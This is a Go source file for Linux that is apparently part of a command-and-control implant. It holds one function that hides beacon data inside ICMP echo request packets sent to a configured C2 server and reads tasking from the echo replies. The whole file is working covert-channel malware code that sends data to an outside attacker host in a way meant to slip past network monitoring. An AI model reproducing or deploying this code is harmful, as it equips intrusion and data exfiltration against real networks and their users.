//go:build linux
// +build linux

package main

import (
	"fmt"
	"net"
	"time"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

// sendICMPBeacon sends beacon data inside ICMP echo request payload to the C2 server.
// Requires CAP_NET_RAW on Linux.
func sendICMPBeacon(body []byte) []byte {
	if C2URL == "" {
		return nil
	}
	host := C2URL
	if len(C2URLs) > 0 {
		host = C2URLs[currentC2Idx]
	}

	// Resolve server host
	raddr, err := net.ResolveIPAddr("ip4", host)
	if err != nil {
		debugLog("ICMP resolve: " + err.Error())
		return nil
	}

	// Open raw ICMP socket
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		debugLog("ICMP listen: " + err.Error())
		return nil
	}
	defer conn.Close()

	// Build ICMP echo request with beacon data as payload
	id := int(time.Now().UnixNano() & 0xFFFF)
	seq := 1
	wm := icmp.Message{
		Type: ipv4.ICMPTypeEcho,
		Code: 0,
		Body: &icmp.Echo{
			ID:   id,
			Seq:  seq,
			Data: body,
		},
	}
	wb, err := wm.Marshal(nil)
	if err != nil {
		debugLog("ICMP marshal: " + err.Error())
		return nil
	}

	// Send to server
	if _, err := conn.WriteTo(wb, raddr); err != nil {
		debugLog("ICMP write: " + err.Error())
		return nil
	}

	// Read reply — ICMP echo reply
	reply := make([]byte, 1500)
	if err := conn.SetReadDeadline(time.Now().Add(5 * time.Second)); err != nil {
		debugLog("ICMP deadline: " + err.Error())
		return nil
	}
	n, peer, err := conn.ReadFrom(reply)
	if err != nil {
		debugLog("ICMP read: " + err.Error())
		return nil
	}

	// Verify source matches
	if peer.String() != raddr.String() {
		debugLog(fmt.Sprintf("ICMP reply from unexpected source: %s", peer.String()))
		return nil
	}

	// Parse ICMP reply
	rm, err := icmp.ParseMessage(ipv4.ICMPTypeEchoReply.Protocol(), reply[:n])
	if err != nil {
		debugLog("ICMP parse: " + err.Error())
		return nil
	}

	switch rm.Type {
	case ipv4.ICMPTypeEchoReply:
		echo, ok := rm.Body.(*icmp.Echo)
		if !ok {
			debugLog("ICMP: unexpected body type")
			return nil
		}
		if echo.ID != id {
			debugLog(fmt.Sprintf("ICMP ID mismatch: %d vs %d", echo.ID, id))
			return nil
		}
		return append([]byte(nil), echo.Data...)
	default:
		debugLog(fmt.Sprintf("ICMP unexpected type: %v", rm.Type))
		return nil
	}
}
